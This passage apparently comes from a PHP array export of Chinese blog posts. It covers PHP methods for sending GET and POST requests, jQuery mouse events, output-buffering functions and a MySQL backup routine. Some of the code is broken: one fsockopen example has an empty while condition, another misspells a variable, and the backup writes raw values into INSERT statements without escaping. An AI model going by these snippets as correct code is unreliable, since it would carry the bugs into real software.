$fp&nbsp;=&nbsp;fopen($url,&nbsp;&#39;r&#39;);&nbsp;&nbsp;
//返回请求流信息（数组：请求状态，阻塞，返回值是否为空，返回值http头等）
stream_get_meta_data($fp);&nbsp;&nbsp;
while(!feof($fp))&nbsp;{&nbsp;&nbsp;
$result&nbsp;.=&nbsp;fgets($fp,&nbsp;1024);&nbsp;&nbsp;
}&nbsp;&nbsp;
echo&nbsp;&quot;url&nbsp;body:&nbsp;$result&quot;;&nbsp;&nbsp;
fclose($fp);&nbsp;&nbsp;
?&gt;

方法3：用file_get_contents函数,以post方式获取url

&nbsp;&nbsp;&nbsp;&nbsp;
&lt;?php&nbsp;&nbsp;
$data&nbsp;=&nbsp;array&nbsp;(&#39;foo&#39;&nbsp;=&gt;&nbsp;&#39;bar&#39;);
//生成url-encode后的请求字符串，将数组转换为字符串&nbsp;&nbsp;
$data&nbsp;=&nbsp;http_build_query($data);&nbsp;&nbsp;
$opts&nbsp;=&nbsp;array&nbsp;(&nbsp;&nbsp;
&lt;span&nbsp;style=&quot;white-space:pre&quot;&gt;&nbsp;&nbsp;&lt;/span&gt;&#39;http&#39;&nbsp;=&gt;&nbsp;array&nbsp;(&nbsp;&nbsp;
&lt;span&nbsp;style=&quot;white-space:pre&quot;&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/span&gt;&#39;method&#39;&nbsp;=&gt;&nbsp;&#39;POST&#39;,&nbsp;&nbsp;
&lt;span&nbsp;style=&quot;white-space:pre&quot;&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/span&gt;&#39;header&#39;=&gt;&nbsp;&quot;Content-type:&nbsp;application/x-www-form-urlencoded\\\\r\\\\n&quot;&nbsp;.&nbsp;&nbsp;
&lt;span&nbsp;style=&quot;white-space:pre&quot;&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/span&gt;&quot;Content-Length:&nbsp;&quot;&nbsp;.&nbsp;strlen($data)&nbsp;.&nbsp;&quot;\\\\r\\\\n&quot;,&nbsp;&nbsp;
&lt;span&nbsp;style=&quot;white-space:pre&quot;&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/span&gt;&#39;content&#39;&nbsp;=&gt;&nbsp;$data&nbsp;&nbsp;
&lt;span&nbsp;style=&quot;white-space:pre&quot;&gt;&nbsp;&nbsp;&lt;/span&gt;)&nbsp;&nbsp;
);
//生成请求的句柄文件&nbsp;&nbsp;
$context&nbsp;=&nbsp;stream_context_create($opts);&nbsp;&nbsp;
$html&nbsp;=&nbsp;file_get_contents(&#39;http://localhost/e/admin/test.html&#39;,&nbsp;false,&nbsp;$context);&nbsp;&nbsp;
echo&nbsp;$html;&nbsp;&nbsp;
?&gt;

方法4：用fsockopen函数打开url，以get方式获取完整的数据，包括header和body,fsockopen需要&nbsp;PHP.ini&nbsp;中&nbsp;allow_url_fopen&nbsp;选项开启

&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;?php&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;get_url&nbsp;($url,$cookie=false)&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;{&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;$url&nbsp;=&nbsp;parse_url($url);&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;$query&nbsp;=&nbsp;$url[path].&quot;?&quot;.$url[query];&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;Query:&quot;.$query;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;$fp&nbsp;=&nbsp;fsockopen(&nbsp;$url[host],&nbsp;$url[port]?$url[port]:80&nbsp;,&nbsp;$errno,&nbsp;$errstr,&nbsp;30);&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(!$fp)&nbsp;{&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;false;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;{&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;$request&nbsp;=&nbsp;&quot;GET&nbsp;$query&nbsp;HTTP/1.1\\\\r\\\\n&quot;;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;$request&nbsp;.=&nbsp;&quot;Host:&nbsp;$url[host]\\\\r\\\\n&quot;;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;$request&nbsp;.=&nbsp;&quot;Connection:&nbsp;Close\\\\r\\\\n&quot;;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;if($cookie)&nbsp;$request.=&quot;Cookie:&nbsp;&nbsp;&nbsp;$cookie\\\\n&quot;;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;$request.=&quot;\\\\r\\\\n&quot;;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;fwrite($fp,$request);&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;while())&nbsp;{&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;$result&nbsp;.=&nbsp;@fgets($fp,&nbsp;1024);&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;fclose($fp);&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;$result;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;//获取url的html部分，去掉header&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;GetUrlHTML($url,$cookie=false)&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;{&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;$rowdata&nbsp;=&nbsp;get_url($url,$cookie);&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;if($rowdata)&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;{&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;$body=&nbsp;stristr($rowdata,&quot;\\\\r\\\\n\\\\r\\\\n&quot;);&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;$body=substr($body,4,strlen($body));&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;$body;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;false;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;?&gt;

方法5：用fsockopen函数打开url，以POST方式获取完整的数据，包括header和body
&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;?php&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;HTTP_Post($URL,$data,$cookie,&nbsp;$referrer=&quot;&quot;)&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;{&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;parsing&nbsp;the&nbsp;given&nbsp;URL&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;$URL_Info=parse_url($URL);&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Building&nbsp;referrer&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;if($referrer==&quot;&quot;)&nbsp;//&nbsp;if&nbsp;not&nbsp;given&nbsp;use&nbsp;this&nbsp;script&nbsp;as&nbsp;referrer&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;$referrer=&quot;111&quot;;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;making&nbsp;string&nbsp;from&nbsp;$data&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;foreach($data&nbsp;as&nbsp;$key=&gt;$value)&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;$values[]=&quot;$key=&quot;.urlencode($value);&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;$data_string=implode(&quot;&amp;&quot;,$values);&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Find&nbsp;out&nbsp;which&nbsp;port&nbsp;is&nbsp;needed&nbsp;-&nbsp;if&nbsp;not&nbsp;given&nbsp;use&nbsp;standard&nbsp;(=80)&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;if(!isset($URL_Info[&quot;port&quot;]))&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;$URL_Info[&quot;port&quot;]=80;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;building&nbsp;POST-request:&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;$request.=&quot;POST&nbsp;&quot;.$URL_Info[&quot;path&quot;].&quot;&nbsp;HTTP/1.1\\\\n&quot;;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;$request.=&quot;Host:&nbsp;&quot;.$URL_Info[&quot;host&quot;].&quot;\\\\n&quot;;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;$request.=&quot;Referer:&nbsp;$referer\\\\n&quot;;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;$request.=&quot;Content-type:&nbsp;application/x-www-form-urlencoded\\\\n&quot;;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;$request.=&quot;Content-length:&nbsp;&quot;.strlen($data_string).&quot;\\\\n&quot;;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;$request.=&quot;Connection:&nbsp;close\\\\n&quot;;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$request.=&quot;Cookie:&nbsp;&nbsp;&nbsp;$cookie\\\\n&quot;;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$request.=&quot;\\\\n&quot;;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;$request.=$data_string.&quot;\\\\n&quot;;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$fp&nbsp;=&nbsp;fsockopen($URL_Info[&quot;host&quot;],$URL_Info[&quot;port&quot;]);&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;fputs($fp,&nbsp;$request);&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;while(!feof($fp))&nbsp;{&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;$result&nbsp;.=&nbsp;fgets($fp,&nbsp;1024);&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;fclose($fp);&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;$result;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;?&gt;

方法6:使用curl库，使用curl库之前，可能需要查看一下php.ini是否已经打开了curl扩展
&nbsp;&nbsp;
&lt;?php&nbsp;&nbsp;
$ch&nbsp;=&nbsp;curl_init();&nbsp;&nbsp;
$timeout&nbsp;=&nbsp;5;&nbsp;&nbsp;
curl_setopt&nbsp;($ch,&nbsp;CURLOPT_URL,&nbsp;&#39;http://www.domain.com/&#39;);&nbsp;&nbsp;
curl_setopt&nbsp;($ch,&nbsp;CURLOPT_RETURNTRANSFER,&nbsp;1);&nbsp;&nbsp;
curl_setopt&nbsp;($ch,&nbsp;CURLOPT_CONNECTTIMEOUT,&nbsp;$timeout);&nbsp;&nbsp;
$file_contents&nbsp;=&nbsp;curl_exec($ch);&nbsp;&nbsp;
curl_close($ch);&nbsp;&nbsp;
echo&nbsp;$file_contents;&nbsp;&nbsp;
?&gt;</pre><p><br/></p>',
            'keyword' => 'get,post,请求,获取',
            'sortid' => '1',
            'img' => '',
            'views' => '0',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-21 16:52:01',
          ),
          12 => 
          array (
            'id' => '73',
            'uid' => '1',
            'title' => 'jQuery中mouseleave和mouseout的区别',
            'content' => '<p>在写项目的时候碰到了一个问题，就是我在为公司网站新首页改版时，需要使用鼠标移入移出事件，但是发现效果很不好，总是达不到效果，上网上搜索了一下，发现了问题。<br/></p><p>很多人在使用jQuery实现鼠标悬停效果时，一般都会用到mouseover和mouseout这对事件。而在实现过程中，可能会出现一些不理想的状况。</p><p>先看下使用mouseout的效果：</p><p><span style=\\"text-decoration: line-through;\\">使用了mouseout事件↓</span></p><p>我们发现使用mouseout事件时，鼠标只要在下拉容器#list里一移动，就触发了hide()，其实是因为mouseout事件是会冒泡的，也就是事件可能被同时绑定到了该容器的子元素上，所以鼠标移出每个子元素时也都会触发我们的hide()。<br/><span id=\\"more-214\\"></span><br/>从jQuery 1.3开始新增了2个mouse事件，mouseenter和mouseleave。与mouseout事件不同，只有在鼠标指针离开被选元素时，才会触发 mouseleave 事件。<br/>我们来看一下mouseleave事件的效果：</p><p><span style=\\"text-decoration: line-through;\\">使用了mouseleave事件↓</span></p><p>mouseleave和mouseout事件各有用途，因为事件冒泡在某些时候是非常有用的。但是当我们不需要冒泡的时候，确实也挺烦人的。</p><p><br/></p>',
            'keyword' => 'jQuery,mouseleave,mouseout',
            'sortid' => '7',
            'img' => '',
            'views' => '0',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-21 16:51:12',
          ),
          13 => 
          array (
            'id' => '72',
            'uid' => '1',
            'title' => 'php函数ob_start()、ob_end_clean()、ob_get_contents()',
            'content' => '<p>下面3个函数的用法</p><ul class=\\"simplelist\\"><li><p><span class=\\"function\\"><a class=\\"function\\" href=\\"http://www.phpstudy.net/php/1605.html\\" rel=\\"rdfs-seeAlso\\">ob_get_contents()</a>&nbsp;- 返回输出缓冲区的内容</span></p></li><li><p>ob_flush() -&nbsp;冲刷出（送出）输出缓冲区中的内容</p></li><li><p><span class=\\"function\\"><a class=\\"function\\" href=\\"http://www.phpstudy.net/php/1600.html\\" rel=\\"rdfs-seeAlso\\">ob_clean()</a>&nbsp;- 清空（擦掉）输出缓冲区</span></p></li><li><p><span class=\\"function\\"><a class=\\"function\\" href=\\"http://www.phpstudy.net/php/1602.html\\" rel=\\"rdfs-seeAlso\\">ob_end_flush()</a>&nbsp;- 冲刷出（送出）输出缓冲区内容并关闭缓冲</span></p></li><li><p><span class=\\"function\\"><a class=\\"function\\" href=\\"http://www.phpstudy.net/php/1601.html\\" rel=\\"rdfs-seeAlso\\">ob_end_clean()</a>&nbsp;- 清空（擦除）缓冲区并关闭输出缓冲</span></p></li><li><p><span class=\\"function\\">flush() - 刷新输出缓冲　　　　</span></p></li></ul><p><strong><span style=\\"color: #ff0000;\\">通常是ob_flush();flush()同时一起使用</span></strong><br/>使用ob_start()把输出那同输出到缓冲区，而不是到浏览器。<br/>然后用ob_get_contents得到缓冲区的数据。</p><p>ob_start()在服务器打开一个缓冲区来保存所有的输出。所以在任何时候使用echo ，输出都将被加入缓冲区中，直到程序运行结束或者使用ob_flush()来结束。然后在服务器中缓冲区的内容才会发送到浏览器，由浏览器来解析显示。<br/><br/>函数ob_end_clean 会清除缓冲区的内容，并将缓冲区关闭，但不会输出内容。<br/>此时得用一个函数ob_get_contents()在ob_end_clean()前面来获得缓冲区的内容。<br/>这样的话， 能将在执行ob_end_clean()前把内容保存到一个变量中，然后在ob_end_clean()后面对这个变量做操作。</p><p><br/></p>',
            'keyword' => 'ob_start,ob_end_clean,ob_get_contents',
            'sortid' => '1',
            'img' => '',
            'views' => '0',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-21 16:47:36',
          ),
          14 => 
          array (
            'id' => '71',
            'uid' => '1',
            'title' => 'php实现数据库备份导出成sql',
            'content' => '<pre class=\\"brush:php;toolbar:false\\">/**
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;数据库备份
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/
&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;dbBackups($sPath=&#39;&#39;)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;header(&quot;Content-type:text/html;charset=utf-8&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//配置信息
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$cfg_dbhost&nbsp;=&nbsp;&#39;localhost&#39;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$cfg_dbname&nbsp;=&nbsp;&#39;dnname&#39;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$cfg_dbuser&nbsp;=&nbsp;&#39;dbuser&#39;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$cfg_dbpwd&nbsp;=&nbsp;&#39;dnpass&#39;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$cfg_db_language&nbsp;=&nbsp;&#39;utf8&#39;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$to_file_name&nbsp;=&nbsp;$sPath.&quot;databases_backup.sql&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//END&nbsp;配置
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//链接数据库
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$link&nbsp;=&nbsp;mysql_connect($cfg_dbhost,$cfg_dbuser,$cfg_dbpwd);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mysql_select_db($cfg_dbname);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//选择编码
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mysql_query(&quot;set&nbsp;names&nbsp;&quot;.$cfg_db_language);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//数据库中有哪些表
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$tables&nbsp;=&nbsp;mysql_query(&quot;SHOW&nbsp;TABLES&nbsp;FROM&nbsp;$cfg_dbname&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//将这些表记录到一个数组
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$tabList&nbsp;=&nbsp;array();
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while($row&nbsp;=&nbsp;mysql_fetch_row($tables))&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$tabList[]&nbsp;=&nbsp;$row[0];
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$sqldump&nbsp;=&nbsp;&#39;&#39;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//echo&nbsp;&quot;运行中，请耐心等待...&lt;br/&gt;&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$info&nbsp;=&nbsp;&quot;--&nbsp;----------------------------\\\\r\\\\n&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$info&nbsp;.=&nbsp;&quot;--&nbsp;日期：&quot;.date(&quot;Y-m-d&nbsp;H:i:s&quot;,time()).&quot;\\\\r\\\\n&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$info&nbsp;.=&nbsp;&quot;--&nbsp;Power&nbsp;by&nbsp;王永东博客(http://www.wangyongdong.com)\\\\r\\\\n&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$info&nbsp;.=&nbsp;&quot;--&nbsp;仅用于测试和学习,本程序不适合处理超大量数据\\\\r\\\\n&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$info&nbsp;.=&nbsp;&quot;--&nbsp;----------------------------\\\\r\\\\n\\\\r\\\\n&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//file_put_contents($to_file_name,$info,FILE_APPEND);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$sqldump&nbsp;.=&nbsp;$info;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//将每个表的表结构导出到文件
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;foreach($tabList&nbsp;as&nbsp;$val){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$sql&nbsp;=&nbsp;&quot;show&nbsp;create&nbsp;table&nbsp;&quot;.$val;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$res&nbsp;=&nbsp;mysql_query($sql,$link);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$row&nbsp;=&nbsp;mysql_fetch_array($res);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$info&nbsp;=&nbsp;&quot;--&nbsp;----------------------------\\\\r\\\\n&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$info&nbsp;.=&nbsp;&quot;--&nbsp;Table&nbsp;structure&nbsp;for&nbsp;`&quot;.$val.&quot;`\\\\r\\\\n&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$info&nbsp;.=&nbsp;&quot;--&nbsp;----------------------------\\\\r\\\\n&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$info&nbsp;.=&nbsp;&quot;DROP&nbsp;TABLE&nbsp;IF&nbsp;EXISTS&nbsp;`&quot;.$val.&quot;`;\\\\r\\\\n&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$sqlStr&nbsp;=&nbsp;$info.$row[1].&quot;;\\\\r\\\\n\\\\r\\\\n&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//追加到文件
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//file_put_contents($to_file_name,$sqlStr,FILE_APPEND);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$sqldump&nbsp;.=&nbsp;$sqlStr;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//释放资源
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mysql_free_result($res);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//将每个表的数据导出到文件
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;foreach($tabList&nbsp;as&nbsp;$val){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$sql&nbsp;=&nbsp;&quot;select&nbsp;*&nbsp;from&nbsp;&quot;.$val;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$res&nbsp;=&nbsp;mysql_query($sql,$link);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//如果表中没有数据，则继续下一张表
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(mysql_num_rows($res)&lt;1)&nbsp;continue;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$info&nbsp;=&nbsp;&quot;--&nbsp;----------------------------\\\\r\\\\n&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$info&nbsp;.=&nbsp;&quot;--&nbsp;Records&nbsp;for&nbsp;`&quot;.$val.&quot;`\\\\r\\\\n&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$info&nbsp;.=&nbsp;&quot;--&nbsp;----------------------------\\\\r\\\\n&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$sqldump&nbsp;.=&nbsp;$info;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//file_put_contents($to_file_name,$info,FILE_APPEND);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//读取数据
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while($row&nbsp;=&nbsp;mysql_fetch_row($res)){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$sqlStr&nbsp;=&nbsp;&quot;INSERT&nbsp;INTO&nbsp;`&quot;.$val.&quot;`&nbsp;VALUES&nbsp;(&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;foreach($row&nbsp;as&nbsp;$zd){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$sqlStr&nbsp;.=&nbsp;&quot;&#39;&quot;.$zd.&quot;&#39;,&nbsp;&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
